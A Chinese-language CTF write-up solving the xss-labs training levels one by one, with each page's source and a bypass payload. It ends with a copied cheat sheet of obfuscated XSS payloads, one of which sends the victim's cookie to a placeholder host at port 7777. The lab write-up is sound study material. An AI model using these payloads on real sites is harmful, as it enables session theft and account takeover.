---
title: xss-labs wp
published: 2025-11-09
updated: 2025-11-23
description: '关于xss漏洞的绕过手法'
tags: [CTF, web, labs]
category: 'CTF'
draft: false
---
# xss-labs wp

开启方式：我是在github下了源码，然后用phpstudy打开使用的，此处存疑，到时候问问有没有别的方法

## level 1

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test";
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<h2 align=center>欢迎用户1</h2><center><img src=level1.png></center>
<h3 align=center>payload的长度:4</h3></body>
</html>

```

==这个靶场的运行逻辑在源代码中也可以找到，alrt()函数被重新定义了，只要调用了alrt()函数，就能触发进入下一关==

![image-20251109123432077](./assets/image-20251109123432077.png)

不难发现注入点，于是可以构造payload：

```html
<script>alert('xss')</script>
```

## level 2（闭合绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<h2 align=center>没有找到和test相关的结果.</h2><center>
<form action=level2.php method=GET>
<input name=keyword  value="test">
<input type=submit name=submit value="搜索"/>
</form>
</center><center><img src=level2.png></center>
<h3 align=center>payload的长度:4</h3></body>
</html>
```

注入点在value中，但是被==">==包住了，所以我们需要先将它闭合来完成绕过

于是构造payload：

```html
"> <script>alert('xss')</script>
```

## level 3（利用js事件绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<h2 align=center>没有找到和相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value=''>	
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level3.png></center>
<h3 align=center>payload的长度:0</h3></body>
</html>
```

这题中value被单引号包裹，尝试上一题的方法不成功，查看源码

![image-20251109130330407](D:\blog\mizuki\src\content\posts\assets\image-20251109130330407-1763911745318-2.png)

发现<>被过滤了,过滤方法是htmlspecialchars()函数，一下是关于它的介绍

> `htmlspecialchars()` 是 PHP 中用于将特殊字符转换为 HTML 实体的核心函数，主要作用是防止跨站脚本攻击（XSS）并确保特殊字符在 HTML 中正确显示。
>
> | 原始字符 | 转义后实体    | 说明                                          |
> | -------- | ------------- | --------------------------------------------- |
> | `<`      | ` &lt;	`   | 防止解析为标签                                |
> | `>`      | ` &gt;	`   | 同上                                          |
> | `&`      | ` &amp;  `    | 防止解析为实体起始符                          |
> | `"`      | ` &quot;	` | 转义双引号（需 `ENT_QUOTES` 或 `ENT_COMPAT`） |
> | `'`      | ` &#039;	` | 转义单引号（需 `ENT_QUOTES`）                 |

要绕过这些，需要使用其他方法，不需要<script>标签，这就需要利用js事件

于是构造payload：

```html
' onclick='alert(1)
```

![image-20251109132152094](D:\blog\mizuki\src\content\posts\assets\image-20251109132152094-1763911745318-1.png)

可以看到我们添加了一个事件，但鼠标点击<input >时触发alert()函数，这样就没有用到<>了

###  JavaScript 事件

------

HTML 事件是发生在 HTML 元素上的事情。

当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。

| 事件        | 描述                                 |
| :---------- | :----------------------------------- |
| onchange    | HTML 元素改变                        |
| onclick     | 用户点击 HTML 元素                   |
| onmouseover | 鼠标指针移动到指定的元素上时发生     |
| onmouseout  | 用户从一个 HTML 元素上移开鼠标时发生 |
| onkeydown   | 用户按下键盘按键                     |
| onload      | 浏览器已完成页面的加载               |

HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。

单引号:

```
<some-HTML-element some-event='JavaScript 代码'>
```

双引号:

```
<some-HTML-element some-event="JavaScript 代码">
```

> #####  **引号可省略的情况**
>
> 根据 HTML5 规范，若事件处理程序的值满足以下条件，引号可以省略17：
>
> - **无空白字符**：属性值中不包含空格、制表符等。
> - **无特殊字符**：不包含 `= > " ' `等符号。
> - **无动态内容**：值为静态字符串或简单表达式。

## level 4

和上一题一样，只是把`'`改成`"`就可以了

payload:

```html
" onclick="alert(1)
```

## level 5（伪协议绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<h2 align=center>没有找到和find a way out!相关的结果.</h2><center>
<form action=level5.php method=GET>
<input name=keyword  value="find a way out!">
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level5.png></center>
<h3 align=center>payload的长度:15</h3></body>
</html>
```

尝试上面几题的方法，都不管用鼠标事件和<script>标签都被_破坏了，所以要用到新东西：==伪协议绕过==

构造payload：

```html
1"> <a href=javascript:alert()>
```

![image-20251109173241878](D:\blog\mizuki\src\content\posts\assets\image-20251109173241878-1763911767818-6.png)

注意到，如此构造后会形成一个新标签<a >内容是生成一个href属性，点击时跳转执行alert()函数，后面的`">`是这个按钮的外表

![image-20251109173458953](D:\blog\mizuki\src\content\posts\assets\image-20251109173458953-1763911767818-5.png)

就像这样，点击即可

#### 关于伪协议:

就是把`javascript:`后面的代码当成javascript命令执行

## level 6（大小写绕过

这道题中href属性也被_阻断了，但是大小写没有过滤，可通过大小写进行绕过

构造payload：

```html
1"><a HrEf=javascript:alert()>
```

## level 7(双写绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<h2 align=center>没有找到和1&quot;&gt;&lt;a href=javascript:alert()&gt;相关的结果.</h2><center>
<form action=level7.php method=GET>
<input name=keyword  value="1"><a =java:alert()>">
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level7.png></center>
<h3 align=center>payload的长度:20</h3></body>
</html>
```

先把上一题的payload复制上去，看看源代码，发现`href`和`script`都被删除了，尝试双写绕过，就是在删除的部分中间再添加一遍，当它把第一遍删掉时就会出现第二部分，再次构成完整的payload

构造payload：

```html
1"><a HrhrefEf=javascrscriptipt:alert()>
```

## level 8 (HTML实体编码绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<center>
<form action=level8.php method=GET>
<input name=keyword  value="javascript:alert(1)">
<input type=submit name=submit value=添加友情链接 />
</form>
</center><center><BR><a href="javascr_ipt:alert(1)">友情链接</a></center><center><img src=level8.jpg></center>
<h3 align=center>payload的长度:20</h3></body>
</html>
```

输入内容会被当做href链接实行，但是scr被过滤，出现会自动添加`_`尝试大小写绕过，发现行不通，自动转换成小写了

所以要用新的办法 ==HTML实体编码绕过==

> 字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。这么做的目的主要有两个：
> １、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（<）和大于号（>），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：
> 小于号这样写：&lt; 或 &#60;
> 大于号这样写：&gt; 或 &#62;
> 前面的写法称为实体名称，后面的写法则是实体编号。[ISO-8859-1字符集](https://www.qqxiuzi.cn/wz/zixun/1681.htm)（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。
> ２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。

![image-20251110140114175](D:\blog\mizuki\src\content\posts\assets\image-20251110140114175-1763911815321-9.png)

payload:

```html
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
```

## level 9(利用php注释符绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<center>
<form action=level9.php method=GET>
<input name=keyword  value="javascript:alert(1)">
<input type=submit name=submit value=添加友情链接 />
</form>
</center><center><BR><a href="您的链接不合法？有没有！">友情链接</a></center><center><img src=level9.png></center>
<h3 align=center>payload的长度:20</h3></body>
</html>
```

感觉这道题是类似白名单的东西，当你的输入中没有`http`或`https`之类的正规网址，就会被waf，但是如果添加了就无法执行

这里也是了解到可以使用php的注释符将所需要的http注释掉，这样就保证既存在`http://`也不会干扰指令的执行

payload:

```html
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29; //http://
```

## level 10(综合尝试：hidden词条

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<h2 align=center>没有找到和123相关的结果.</h2><center>
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
</form>
</center><center><img src=level10.png></center>
<h3 align=center>payload的长度:3</h3></body>
</html>
```

发现三个hidden属性的输入框，先把`hidden`改成`text`展现出来

发现直接输入没有用，尝试在url中输入

```html
http://localhost/xss-labs-master/level10.php?keyword=123&t_link=1&t_history=2&t_sort=3
```

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<h2 align=center>没有找到和123相关的结果.</h2><center>
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="3" type="hidden">
</form>
</center><center><img src=level10.png></center>
<h3 align=center>payload的长度:3</h3></body>
</html>
```

发现在`t_sort`中可以使用，找到xss漏洞

一开始尝试简单的<script>事件，但是发现<>被过滤了，再尝试js事件

payload:

```html
http://localhost/xss-labs-master/level10.php?keyword=123&t_sort=%22%20onclick=%22alert(1)
```

## level 11 (referer注入

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<h2 align=center>没有找到和good job!相关的结果.</h2><center>
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ref"  value="http://localhost/xss-labs-master/level10.php?keyword=123&t_sort=%22%20onclick=%22alert(1)" type="hidden">
</form>
</center><center><img src=level11.png></center>
<h3 align=center>payload的长度:9</h3></body>
</html>
```

按照上一题的解法发现不可用，引号被过滤了

但是存在`t_ref`输入，发现它的内容是一个网址，猜测是reference请求头

![image-20251110193453904](D:\blog\mizuki\src\content\posts\assets\image-20251110193453904-1762774494740-1-1763911850330-11.png)

用hackbar发送一个网址，发现`t_ref`的值改变了，改变为我的输入值，发现xss漏洞

payload to Referen:

```html
" onclick="alert(1)
```

![image-20251110193719479](./assets/image-20251110193719479.png)

## level 12(User-agent注入

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<h2 align=center>没有找到和good job!相关的结果.</h2><center>
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_ua"  value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0" type="hidden">
</form>
</center><center><img src=level12.png></center>
<h3 align=center>payload的长度:9</h3></body>
</html> 
```

与上一题一样，但注入点变成`User-Agent`

有问题：hackbar不能用，只能用bp抓包

payload:

```html
" onclick="alert(1)
```

## level 13(cookie注入

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<h2 align=center>没有找到和相关的结果.</h2><center>
<form id=search>
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
<input name="t_cook"  value="" type="hidden">
</form>
</center><center><img src=level13.png></center>
<h3 align=center>payload的长度:0</h3></body>
</html>
```

和上面两题一样，看到`t_cook`我就想到`cookie`,尝试cookie注入

不想多说，过程一样

## level 14

```html
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>
```

这一关有一个链接但是跳转过去什么都没有，后来查了wp发现用不了了，直接跳过

## level 15(ng-include文件包含

```html
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<body><span class="ng-include:"></span></body>
   
```

> ng-include指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include属性的值可以是一个表达式，返回一个文件名。 ==默认情况下，包含的文件需要包含在同一个域名下==。

例如输入

```html
?src='level1.php'
```

![image-20251111205735826](D:\blog\mizuki\src\content\posts\assets\image-20251111205735826-1763911874675-13.png)

就会在这个页面添加`level 1.php`的内容，我们可以利用这个特性，借助别的level的payload来通关这道题

```html
?src='<script>alert()</script>'
```

上传后发现被实体转义了，但这不是过滤的关键，因为<img><a>等标签虽然也会被转义但任能正常使用

> 该代码无法生效的本质是「框架安全过滤 + 浏览器安全限制 + 标签执行特性」的三重防御：
>
> 1. AngularJS 的 `$sanitize` 服务直接剥离 `<script>` 标签；
> 2. 即使未被过滤，浏览器也不会执行动态插入的 `<script>`；
> 3. `ng-include` 的编译机制不支持执行模板内的脚本。

所以得换个思路，创造一个可以使用的"按钮"来间接完成注入

```html
?src=%27level1.php?name=<input%20name=XXX%20onmouseover=alert()>%27
```

or

```html
?src='level1.php?name=<img src=XXX onmouseover=alert()>'
```

这里的src是img标签展示图片的地址，是<img>必要部分，当输入的地址不存在时，也会插入一个标志，可以用于完成js事件

## level 16(空格绕过

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<center>test</center><center><img src=level16.png></center>
<h3 align=center>payload的长度:4</h3></body>
</html>
```

先尝试最基础的<script>标签，发现被实体转义了（可能）接着又试了<img>标签，发现空格被实体转义了

所以绕过空格就好了，url中直接用`%0a`绕过

```html
?keyword=<img%0asrc=xxx%0aonclick=alert()>
```

## level 17

看到个链接点了就跳了，奇奇怪怪的

## level 18

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level19.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level18</title>
</head>
<body>
<h1 align=center>欢迎来到level18</h1>
<embed src=xsf02.swf?a=b width=100% heigth=100%></body>
</html>
```

这题涉及embed标签，它是用来嵌入外部内容，比如插件、多媒体文件等。

尝试在url中直接修改数值，会显示在源码中，所以存在注入点，只需要给<embed>添加一个js事件，当鼠标点击时触发alert就行

payload：

```html
?arg01=a&arg02=b%20onclick=alert()
```

## level 19

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level20.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level19</title>
</head>
<body>
<h1 align=center>欢迎来到level19</h1>
<embed src="xsf03.swf?a=b" width=100% heigth=100%></body>
</html>
```

这道题与上题的区别就是多了个引号，那先尝试拼接引号，果然被实体转义了

看了大佬的wp，竟然如此复杂，在群里问了一下

> 感觉就是为了出题而出题，可以不用太在意

我可是出了名的听劝，跳了

# 总结：

从`@err0r`那copy了一份常见payload，以前就看过了，但现在这么过一遍更熟悉了

## fuzz字符

```html
'';!--"<h1>=&{()}</h1>
```

## 基础payload

```html
<Details Open OnToggle =co\u006efirm`XSS`>
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<Details Open OnToggle =co\u006efirm`XSS`>
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<a href=1 onmouseover=alert(1)>nmask</a>
<a href="javascript:confirm('xxx')" target="_blank" rel="nofollow">你可以点击我触发</a>
<body onhashchange=a=alert,a(document.domain)>  
<!-- # http://xxx.xxx.xxx#123 http://xxx.xxx.xxx#124 触发 -->
<body/onpageshow=alert(1)>
<body onpageshow=alert(1)>
<details/open/ontoggle=top["al"+"ert"](1)>
<discard onbegin=[1].find(alert)>
<iframe src=javascript:alert(1)>
<img src onerror=alt=''+document.domain>
<img src="X" onerror=(a=alert,b=document['\x63\x6f\x6f\x6b\x69\x65'],a(b))>
<img src="X" onerror=top[8680439..toString(30)](1337)>
<img src="x:alert" onerror="eval(src+'(0)')">
<img src=# onerror=a=alert,a(1)>
<img src=0 onerror=confirm('1')>
<img src=1 onmouseover=alert(1)>
<img src=x onerror=setInterval`alert\x28document.domain\x29`>
<img src=x onerror=setTimeout`alert\x28document.cookie\x29`>
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img/src/onerror=alert(1)>
<input class="" name="roots" id="roots" type="text" value=1 onfocus=alert(11) autofocus=>
<input type="hidden" name="returnurl" value="" accesskey="X" onclick="alert(document.domain)" /> <!--针对 hidden 的 input 标签，firefox下 shift+alt+X 成功-->
<input type=text autofocus/onfocus='prompt(1);'/>//
<marquee onstart=alert(1)>
<video autoplay onloadstart="alert()" src=x></video>
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src=x></video>
<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<marquee loop=1 onFinish='alert(1)'>123</marquee>   <!-- # 滚动标签 -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<script>a=prompt;a(1)</script>
: </script><embed/embed/embed/src=https://14.rs>
<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script> <!--用分号，也可以分号+空格（回车一起使用）-->
<script>window.a==1?1:prompt(a=1)</script>
<svg/onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()">
<svg/onload=[document.cookie].find(alert)>
<svg/onload=alert&lpar;1&rpar;>
<svg/onload=alert(1)>
<svg/onload=top['al\145rt'](1)>
<svg/onload=top[/al/.source+/ert/.source](1)>
<x/oncut=alert(1)>a
<iframe/src="data:text&sol;html;&Tab;base64">&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<svg id="rectangle" xmlns="http://www.w3.org/2000/svg"xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><a xlink:href="javascript:alert(location)"><rect x="0" y="0" width="100" height="100" /></a></svg>
<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle"/></svg>
<embed src=javascript:alert(1)>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<body onload="window.open('http://xxx:7777/'+document.cookie)"></body>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
```

